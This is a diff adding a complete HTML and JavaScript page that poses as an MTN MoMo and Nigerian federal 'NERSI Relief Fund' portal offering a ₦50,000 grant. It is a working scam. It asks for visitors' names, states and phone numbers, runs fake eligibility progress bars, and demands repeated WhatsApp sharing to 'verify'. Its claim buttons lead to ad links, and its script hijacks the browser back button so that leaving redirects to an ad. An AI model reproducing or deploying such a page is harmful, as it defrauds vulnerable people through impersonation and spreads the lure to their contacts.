@@ -1,0 +1,673 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <title>NERSI Relief Fund - MTN MoMo Portal</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    
+    <!-- FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    
+    <!-- Meta Previews -->
+    <meta property="og:title" content="NERSI Relief Fund - MTN MoMo Portal" />
+    <meta property="og:description" content="Apply for the ₦50,000 NERSI Relief Fund directly via MTN MoMo." />
+    <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBHpNtV2oE87jo-zNp68uFSCPf9qN-Law71LLZYIG09CdfPgRbi8fpi7lh9CtewRTQVHCqhnGAa-snZG5BFCg1p9rr9isP8JyQsUyiFOGQLtzE8hF2J6d54IcT6m8-g9cV_knrHkcxYK3Us2LkxQ25nuGmFj3fbiVyQsObTliqA01NSsMTdlUE1XziP2w/s738/35962.jpg" />
+    <meta property="og:type" content="website" />
+
+    <style>
+        /* ═══════════════════════════════════════════ 
+           RESET & BASE APP STYLES
+        ═══════════════════════════════════════════ */
+        :root {
+            --mtn-yellow: #FFCC00;      
+            --mtn-dark: #111111;       
+            --nersi-green: #1f3e2c;
+            --bg-gray: #F4F6F8;
+        }
+
+        * { 
+            margin: 0; 
+            padding: 0; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            box-sizing: border-box; 
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body { 
+            background-color: var(--bg-gray);
+            color: var(--mtn-dark);
+            overflow-x: hidden;
+        }
+        
+        a { text-decoration: none; }
+
+        /* ═══════════════════════════════════════════ 
+           HEADER (Exact Match to Image 1)
+        ═══════════════════════════════════════════ */
+        .app-header {
+            background: var(--mtn-yellow);
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 900;
+            border-bottom: 1px solid rgba(0,0,0,0.1);
+        }
+        .app-logo {
+            height: 35px;
+            width: auto;
+        }
+        .app-menu {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            cursor: pointer;
+        }
+        .app-menu span {
+            display: block;
+            width: 28px;
+            height: 3px;
+            background-color: var(--mtn-dark);
+            border-radius: 2px;
+        }
+
+        /* ═══════════════════════════════════════════ 
+           MAIN CONTENT AREA
+        ═══════════════════════════════════════════ */
+        #mainFlow {
+            display: none;
+            padding-bottom: 100px; /* Space for sticky button */
+            min-height: calc(100vh - 120px);
+        }
+
+        .app-section {
+            display: none;
+            padding: 25px 20px;
+            animation: fadeIn 0.4s ease;
+        }
+        .app-section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .app-title {
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 15px;
+            color: var(--mtn-dark);
+        }
+        .app-subtitle {
+            font-size: 15px;
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+
+        /* Form Inputs */
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #333;
+        }
+        .app-input {
+            width: 100%;
+            height: 55px;
+            padding: 0 15px;
+            font-size: 16px;
+            border: 2px solid #E0E0E0;
+            border-radius: 8px;
+            background: #fff;
+            outline: none;
+            transition: border 0.2s;
+        }
+        .app-input:focus {
+            border-color: var(--mtn-yellow);
+        }
+
+        /* Sticky Bottom Button */
+        .sticky-btn-container {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: #fff;
+            padding: 15px 20px;
+            box-shadow: 0 -4px 10px rgba(0,0,0,0.05);
+            z-index: 800;
+        }
+        .btn-app {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 55px;
+            background: var(--mtn-yellow);
+            color: var(--mtn-dark);
+            font-size: 18px;
+            font-weight: 800;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .btn-app:active { background: #e6b800; }
+        .btn-green { background: var(--nersi-green); color: #fff; }
+        .btn-green:active { background: #0f1f16; }
+        .btn-whatsapp { background: #25D366; color: #fff; }
+
+        /* Loader */
+        .app-loader {
+            text-align: center;
+            padding: 50px 20px;
+        }
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid #eee;
+            border-top: 5px solid var(--mtn-yellow);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        /* Progress Bar */
+        .progress-wrapper {
+            margin: 20px 0;
+        }
+        .progress-bg {
+            width: 100%;
+            height: 12px;
+            background: #E0E0E0;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: var(--mtn-yellow);
+            transition: width 0.1s linear;
+        }
+        .progress-text {
+            text-align: right;
+            font-size: 14px;
+            font-weight: 700;
+            margin-top: 5px;
+        }
+
+        /* Receipt / Result Box */
+        .receipt-card {
+            background: #fff;
+            border: 1px solid #eee;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.03);
+        }
+        .receipt-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 14px;
+            border-bottom: 1px dashed #eee;
+            padding-bottom: 10px;
+        }
+        .receipt-item:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0;}
+        .receipt-label { color: #666; }
+        .receipt-value { font-weight: 700; color: var(--mtn-dark); text-align: right;}
+
+        /* Blinking Badge */
+        .badge-pending {
+            background: #ffebee;
+            color: #d32f2f;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.4; }
+            100% { opacity: 1; }
+        }
+
+        /* ═══════════════════════════════════════════ 
+           FOOTER (Exact Match to Image 2)
+        ═══════════════════════════════════════════ */
+        .app-footer {
+            background: var(--mtn-dark);
+            color: #fff;
+            padding: 40px 20px;
+        }
+        .footer-socials {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        .footer-socials a {
+            color: var(--mtn-yellow);
+            font-size: 16px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+        }
+        .footer-divider {
+            height: 1px;
+            background: #333;
+            margin-bottom: 30px;
+        }
+        .footer-legal {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        .footer-legal a {
+            color: #ddd;
+            font-size: 15px;
+        }
+        .footer-copy {
+            color: #777;
+            font-size: 12px;
+            line-height: 1.6;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* Supercounter Container */
+        .supercounter-wrap {
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #333;
+            text-align: left;
+        }
+
+        /* ═══════════════════════════════════════════ 
+           POPUP MODAL
+        ═══════════════════════════════════════════ */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s;
+        }
+        .modal-overlay.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        .modal-box {
+            background: #fff;
+            width: 90%;
+            max-width: 400px;
+            border-radius: 16px;
+            padding: 30px 20px;
+            text-align: center;
+            transform: translateY(20px);
+            transition: transform 0.3s;
+        }
+        .modal-overlay.active .modal-box {
+            transform: translateY(0);
+        }
+        .modal-logos {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .modal-logos img { height: 40px; }
+        .modal-box h3 { font-size: 20px; font-weight: 800; margin-bottom: 10px; color: var(--nersi-green); }
+        .modal-box p { font-size: 14px; color: #666; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+    <!-- POPUP MODAL -->
+    <div class="modal-overlay" id="popupModal">
+        <div class="modal-box">
+            <div class="modal-logos">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-w94XYiS24aFcCMApzM-7DDxzR4v4c0bOh0TLQ686ZmxQQ2GDXDS0aUgYfV5EWX4TpclrY6VZ4wz0jj9KL_slpWq9yfPFVvoTXGbhYe83iP9-UbXBs1XmteYgWiZk84q7BGe8ehLZgbB5Jjs-mY7QhBvMthAjkFBDeZXvTVI9jrWWlMBVbfbfDTQrfI4/s180/35812.png" alt="NERSI">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhaPUV5EAHpEV91i0a4YCLrvwONj-w2iTmOvzI1YrZZ5MxWn4nV0zdkCwxdjJ7YEcWF2UvQ0EgZVuZeTBT2uZhGtYHHpDwRsxmOVvu9JmGw8egxx1eDmAywESgpnL3W7ZeqwXg4XtkeMMoLeVOliTCvg6LtW2easMo8znqZ4GkN4fINRQMWH8Bhfuxmc7c/s320/36631.png" alt="MoMo">
+            </div>
+            <h3>NERSI Relief Fund</h3>
+            <p>Enter your MTN MoMo number to check eligibility for the ₦50,000 grant.</p>
+            <form id="popupForm">
+                <input type="tel" id="popupPhone" class="app-input" style="margin-bottom: 15px;" placeholder="0801 234 5678" required>
+                <button type="submit" class="btn-app" style="background: var(--mtn-dark); color: var(--mtn-yellow);">CONTINUE</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- HEADER -->
+    <header class="app-header">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhaPUV5EAHpEV91i0a4YCLrvwONj-w2iTmOvzI1YrZZ5MxWn4nV0zdkCwxdjJ7YEcWF2UvQ0EgZVuZeTBT2uZhGtYHHpDwRsxmOVvu9JmGw8egxx1eDmAywESgpnL3W7ZeqwXg4XtkeMMoLeVOliTCvg6LtW2easMo8znqZ4GkN4fINRQMWH8Bhfuxmc7c/s320/36631.png" alt="MTN" class="app-logo">
+        <div class="app-menu">
+            <span></span>
+            <span></span>
+        </div>
+    </header>
+
+    <!-- MAIN FLOW -->
+    <div id="mainFlow">
+        
+        <!-- SCREEN 1: LOADER -->
+        <div class="app-section active" id="screen-loader">
+            <div class="app-loader">
+                <div class="spinner"></div>
+                <h2 class="app-title" id="load-text">Checking Eligibility...</h2>
+                <p class="app-subtitle">Please wait while we connect to the MTN MoMo database.</p>
+            </div>
+        </div>
+
+        <!-- SCREEN 2: INTRO -->
+        <div class="app-section" id="screen-intro">
+            <h2 class="app-title">Welcome to the NERSI Portal</h2>
+            <p class="app-subtitle">
+                The Federal Government of Nigeria, in partnership with MTN MoMo, is disbursing a <b>₦50,000 Relief Grant</b> to vulnerable citizens. 
+            </p>
+            <div style="background: #fff; padding: 20px; border-radius: 12px; border-left: 4px solid var(--mtn-yellow); margin-bottom: 20px;">
+                <p style="font-size: 14px; line-height: 1.5; color: #333;">
+                    <b>Note:</b> You must be 18 years or older and use an active MTN number to qualify. Funds are sent directly to your MoMo wallet.
+                </p>
+            </div>
+            <div class="sticky-btn-container">
+                <button class="btn-app" id="btn-start">START APPLICATION</button>
+            </div>
+        </div>
+
+        <!-- SCREEN 3: FORM (Bank fields removed) -->
+        <div class="app-section" id="screen-form">
+            <h2 class="app-title">Applicant Details</h2>
+            <p class="app-subtitle">Ensure all details match your MTN MoMo registration.</p>
+            
+            <div class="input-group">
+                <label>Full Name</label>
+                <input type="text" id="name" class="app-input" placeholder="e.g. John Doe">
+            </div>
+            <div class="input-group">
+                <label>State of Origin</label>
+                <select id="state" class="app-input">
+                    <option value="" disabled selected>Select State</option>
+                    <option value="Abia">Abia</option><option value="Adamawa">Adamawa</option>
+                    <option value="Akwa Ibom">Akwa Ibom</option><option value="Anambra">Anambra</option>
+                    <option value="Bauchi">Bauchi</option><option value="Bayelsa">Bayelsa</option>
+                    <option value="Benue">Benue</option><option value="Borno">Borno</option>
+                    <option value="Cross River">Cross River</option><option value="Delta">Delta</option>
+                    <option value="Ebonyi">Ebonyi</option><option value="Edo">Edo</option>
+                    <option value="Ekiti">Ekiti</option><option value="Enugu">Enugu</option>
+                    <option value="FCT">FCT - Abuja</option><option value="Gombe">Gombe</option>
+                    <option value="Imo">Imo</option><option value="Jigawa">Jigawa</option>
+                    <option value="Kaduna">Kaduna</option><option value="Kano">Kano</option>
+                    <option value="Katsina">Katsina</option><option value="Kebbi">Kebbi</option>
+                    <option value="Kogi">Kogi</option><option value="Kwara">Kwara</option>
+                    <option value="Lagos">Lagos</option><option value="Nasarawa">Nasarawa</option>
+                    <option value="Niger">Niger</option><option value="Ogun">Ogun</option>
+                    <option value="Ondo">Ondo</option><option value="Osun">Osun</option>
+                    <option value="Oyo">Oyo</option><option value="Plateau">Plateau</option>
+                    <option value="Rivers">Rivers</option><option value="Sokoto">Sokoto</option>
+                    <option value="Taraba">Taraba</option><option value="Yobe">Yobe</option>
+                    <option value="Zamfara">Zamfara</option>
+                </select>
+            </div>
+            <div class="input-group">
+                <label>MTN Phone Number</label>
+                <input type="tel" id="add" class="app-input" placeholder="0801 234 5678">
+            </div>
+
+            <div class="sticky-btn-container">
+                <button class="btn-app" id="btn-submit">SUBMIT</button>
+            </div>
+        </div>
+
+        <!-- SCREEN 4: PROCESSING -->
+        <div class="app-section" id="screen-processing">
+            <div style="text-align: center; margin-top: 40px;">
+                <div class="spinner"></div>
+                <h2 class="app-title">Processing Application</h2>
+                <p class="app-subtitle">Verifying your details with the NERSI database...</p>
+                <div class="progress-wrapper" style="max-width: 300px; margin: 30px auto;">
+                    <div class="progress-bg">
+                        <div class="progress-bar" id="progBar1"></div>
+                    </div>
+                    <div class="progress-text" id="progText1">0%</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- SCREEN 5: RESULT -->
+        <div class="app-section" id="screen-result">
+            <h2 class="app-title" style="color: var(--nersi-green);">Application Received</h2>
+            <p class="app-subtitle">Your details have been verified and pre-qualified for the ₦50,000 grant.</p>
+
+            <div class="receipt-card">
+                <div class="receipt-item">
+                    <span class="receipt-label">Applicant</span>
+                    <span class="receipt-value" id="res-name"></span>
+                </div>
+                <div class="receipt-item">
+                    <span class="receipt-label">Phone</span>
+                    <span class="receipt-value" id="res-phone"></span>
+                </div>
+                <div class="receipt-item">
+                    <span class="receipt-label">Status</span>
+                    <span class="badge-pending">PENDING</span>
+                </div>
+            </div>
+
+            <p class="app-subtitle" style="font-size: 14px; font-weight: 600; text-align: center;">
+                To complete your application and receive your funds, you must complete the human verification process below.
+            </p>
+            <p style="font-size: 13px; color: #666; margin-bottom: 20px;">
+                1. Click the WhatsApp Share button.<br>
+                2. Share to 5 groups or 15 friends.<br>
+                3. Your status will automatically update.
+            </p>
+
+            <div class="progress-wrapper">
+                <div class="progress-bg">
+                    <div class="progress-bar" id="progBar2"></div>
+                </div>
+                <div class="progress-text" id="progText2">0%</div>
+            </div>
+
+            <div class="sticky-btn-container">
+                <button class="btn-app btn-whatsapp" id="btn-share"><i class="fab fa-whatsapp" style="margin-right: 10px;"></i> SHARE TO VERIFY</button>
+            </div>
+        </div>
+
+        <!-- SCREEN 6: CLAIM -->
+        <div class="app-section" id="screen-claim">
+            <div style="text-align: center; margin-top: 20px;">
+                <i class="fa fa-check-circle" style="font-size: 60px; color: var(--nersi-green); margin-bottom: 15px;"></i>
+                <h2 class="app-title">Verification Complete</h2>
+                <p class="app-subtitle">Your payment has been approved. Click the button below to claim your ₦50,000 grant.</p>
+            </div>
+
+            <div class="sticky-btn-container" style="display: flex; flex-direction: column; gap: 10px;">
+                <button class="btn-app btn-green" onclick="window.open('https://uplcm.com/4/10077877')">CLAIM PAYMENT</button>
+                <button class="btn-app" style="background: var(--mtn-dark); color: var(--mtn-yellow);" onclick="window.open('https://uplcm.com/4/9742092')">GET CODE</button>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- FOOTER (Exact Match to Image 2) -->
+    <footer class="app-footer">
+        <div class="footer-socials">
+            <a href="#">WHATSAPP</a>
+            <a href="#">FACEBOOK</a>
+            <a href="#">INSTAGRAM</a>
+            <a href="#">X</a>
+            <a href="#">LINKEDIN</a>
+            <a href="#">YOUTUBE</a>
+        </div>
+        <div class="footer-divider"></div>
+        <div class="footer-legal">
+            <a href="#">Privacy And Data Protection Policy</a>
+            <a href="#">Terms & Conditions</a>
+        </div>
+        <div class="footer-copy">
+            &copy; 2022 MTN NIGERIA COMMUNICATIONS PLC, ALL RIGHTS RESERVED.
+        </div>
+        
+        <!-- SUPERCOUNTER ADDED HERE -->
+        <div class="supercounter-wrap">
+            <script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script>
+            <script type="text/javascript">sc_online_i(1739840,"ffffff","ffffff");</script>
+        </div>
+    </footer>
+
+    <!-- JQUERY -->
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+    
+    <script>
+        $(document).ready(function () {
+            
+            var redirectUrl = "https://uplcm.com/4/10077877";
+
+            // Show Popup on Load
+            setTimeout(function () {
+                $('#popupModal').addClass('active');
+            }, 500);
+
+            // Popup Submit -> Show Main Flow & Loader
+            $('#popupForm').submit(function(e) {
+                e.preventDefault();
+                var phone = $('#popupPhone').val().trim();
+                if(phone.length < 8) { alert("Enter a valid phone number"); return; }
+                
+                window.savedPhone = phone;
+                $('#popupModal').removeClass('active');
+                $('#mainFlow').show();
+
+                // Loader Animation
+                var i = 0;
+                var interval = setInterval(function() {
+                    i++;
+                    $('#load-text').text('Checking Eligibility... ' + i + '%');
+                    if(i >= 100) {
+                        clearInterval(interval);
+                        $('#screen-loader').removeClass('active');
+                        $('#screen-intro').addClass('active');
+                    }
+                }, 20);
+            });
+
+            // Intro -> Form
+            $('#btn-start').click(function() {
+                $('#screen-intro').removeClass('active');
+                $('#screen-form').addClass('active');
+                if(window.savedPhone) { $('#add').val(window.savedPhone); }
+                window.scrollTo(0,0);
+            });
+
+            // Form -> Processing -> Result (UPDATED VALIDATION)
+            $('#btn-submit').click(function() {
+                if($('#name').val().length < 3 || $('#add').val().length < 8 || $('#state').val() === null) {
+                    alert("Please fill in your Name, State, and Phone Number correctly!");
+                    return;
+                }
+
+                // Populate Result Box
+                $('#res-name').text($('#name').val());
+                $('#res-phone').text($('#add').val());
+
+                // Hide Form, Show Processing
+                $('#screen-form').removeClass('active');
+                $('#screen-processing').addClass('active');
+                window.scrollTo(0,0);
+
+                // Processing Progress Bar
+                var i = 0;
+                var interval = setInterval(function() {
+                    i++;
+                    $('#progText1').text(i + '%');
+                    $('#progBar1').css('width', i + '%');
+                    
+                    if(i == 70) { i = 69; setTimeout(function(){ i = 70; }, 1000); }
+                    
+                    if(i >= 100) {
+                        clearInterval(interval);
+                        setTimeout(function() {
+                            $('#screen-processing').removeClass('active');
+                            $('#screen-result').addClass('active');
+                            window.scrollTo(0,0);
+                        }, 500);
+                    }
+                }, 30);
+            });
+
+            // Share Verification Logic
+            var shareText = "*NERSI RELIEF FUND (VIA MTN MOMO) 2026*%0A%0AThe Federal Government is giving out *₦50,000 Grant*. Apply via MTN MoMo now. %0A%0AAPPLY HERE👉: https://metaink.xyz/NERSI-Relief-Fund %0A%0A*_Forward To Other Nigerians To Benefit._*";
+            var shareUrl = "whatsapp://send?text=" + shareText;
+            var width = 0;
+
+            $('#btn-share').click(function() {
+                window.location.href = shareUrl;
+                
+                if (width == 0) { width += 50; } 
+                else if (width == 50) { alert("Verification Failed!\nYou must share with at least 5 groups or 15 friends to complete the process."); width += 15; } 
+                else if (width == 65) { width += 5; } 
+                else if (width == 70) { alert("Almost there! Please share to one more group to verify."); width += 10; } 
+                else if (width == 80) { alert("Processing... Please share again."); width += 5; } 
+                else if (width == 85) { width += 2; } 
+                else if (width == 87) { width += 1; } 
+                else if (width == 88) { width += 2; } 
+                else if (width == 90) { width += 1; } 
+                else if (width == 91) { width += 1; } 
+                else if (width == 92) { width += 1; } 
+                else if (width == 93) { width += 1; } 
+                else if (width == 94) { width += 1; } 
+                else if (width == 95) { width += 1; } 
+                else if (width == 96) { width += 2; } 
+                else { 
+                    // Move to final claim screen
+                    $('#screen-result').removeClass('active'); 
+                    $('#screen-claim').addClass('active'); 
+                    window.scrollTo(0,0);
+                    return; 
+                }
+                
+                setTimeout(function () {
+                    $('#progBar2').css("width", width + "%");
+                    $('#progText2').text(width + "%");
+                }, 1000);
+            });
+
+            // PREVENT BACK BUTTON & REDIRECT TO AD
+            window.addEventListener('popstate', function() {
+                history.pushState(null, null, document.URL);
+                window.location.href = redirectUrl; 
+            });
+            
+            history.pushState(null, null, document.URL);
+
+            window.onhashchange = function () { jp(); }; 
+            function hh() { history.pushState(history.length + 1, "message", "#" + Math.random()); } 
+            function jp() { fh(); } 
+            setTimeout('hh();', 500); 
+            function fh() { location.href = redirectUrl; } 
+        });
+    </script>
+</body>
+</html>
